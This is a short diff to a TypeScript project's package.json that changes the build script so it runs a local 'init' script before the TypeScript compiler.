@@ -18,7 +18,7 @@
   },
   "license": "MIT",
   "scripts": {
-    "build": "tsc"
+    "build": "node init && tsc"
   },
   "dependencies": {
     "@typescript-eslint/utils": "^5.62.0",
